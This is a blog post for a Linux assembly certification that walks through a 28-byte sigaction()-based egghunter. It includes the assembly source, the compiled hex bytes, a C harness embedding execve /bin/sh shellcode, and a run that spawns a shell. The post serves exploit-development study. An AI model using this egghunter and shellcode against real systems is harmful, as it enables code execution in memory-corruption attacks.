---
title:  "[SLAE 3] Egghunter Shellcode"
categories: [SLAE]
---

![Logo](/assets/images/tux-root.png)

## Creating an egghunter shellcode

For the third assignment of the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) course I've studied different egghunter payloads. The starting reference paper for this is **skape**'s [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). 

I've implemented the 3 methods described in the paper:
* **access()** - Small and robust egghunter using _`access()`_ system call to check validity  of addresses. 
  * **Cons**: size is 39 bytes and the egg needs to be executable because after finding it, the execution jump before the egg and continues on.
* **access() revisited** - smaller (35 bytes), minor speed improvements, egg does not need to be executable. 
  * **Cons**: sets DF flag in case of failure (in very rare cases this could impact the running of the host application)
* **sigaction()** - even smaller (30 bytes), robust and very fast (validates 16 bytes at a time). 
  * **Cons**: some very rare odd failure situation described in detail in the paper.

For the purpose of this post, I'll detail my slightly modified version of the _`sigaction()`_ egghunter:
* **sigaction() reloaded** - the smallest version (__*only 28 bytes*__). I've replaced the double check for the egg with only one check. To avoid finding the egg in the comparison from the shellcode, I've applied a small transform before searching for it (_`inc eax`_ in this case, but could be any other 1 bytecode operation also - e.g. shifting bytes).

```c
global _start   

section .text
_start:
    or cx,0xfff             ; page allignment
next_addr:
    inc ecx                 ; Pointer to region to be validated
    push byte +0x43         ; sigaction() syscall number
    pop eax                 ; Syscall number in eax
    int 0x80                ; Execut ethe syscall
    cmp al,0xf2             ; Compare with EFAULT
    jz short _start         ; Go to next page
    mov eax, <EGG>          ; The egg
    inc eax                 ; Egg modification. Avoid first find from above!
    mov edi,ecx             ; Prepare for comparison
    scasd                   ; Compare
    jnz short next_addr     ; Jump to next address
    jmp edi                 ; Jump to shellcode
```

To test it I've used the following C program simulating a real payload:
```
[  filler  ] [  egghunter  ] [  garbage  ] [  shellcode  ]
```

```c
#include <stdio.h>
#include <string.h>
 
#define     EGG     "<EGG>"
 
unsigned char sled[] = "Some misc bytes here";
unsigned char egghunter[] = 
        "<EGGHUNTER>";
unsigned char garbage[] = "Garbage, mangled bytes, whatever";
// execve(/bin/sh,..) shellcode here 
unsigned char shellcode[] = EGG
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
                "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
// Function pointer
typedef int (*func_ptr)();
 
void main() {
    printf("Egghunter length: %d bytes\n", strlen(egghunter));
    printf("Shellcode Length:  %d bytes\n", strlen(shellcode));
 
    ((func_ptr) egghunter)();
}
```

The egg is configurable, and the compilation takes place from a wrapper script: 
```bash
$ ./compile.sh 
Usage: compile.sh {4 chars EGG mark}
 E.g.: compile.sh W00T
$ ./compile.sh BUBU
  [*] Using egg  BUBU
  [*] (Modified) Egg hex:, 0x55425542
  [+] Replace egg with, BUBU
  [+] Assembling egghunter
  [+] Linking egghunter
  [*] Egghunter:
\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x42\x55\x42\x55\x40\x89\xcf\xaf\x75\xeb\xff\xe7
  [+] Compile shellcode tester
  [+] House cleaning
  [+] Done! run ./shellcode
$ ./shellcode
Egghunter length: 28 bytes
Shellcode Length:  29 bytes
$ whoami
liv
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
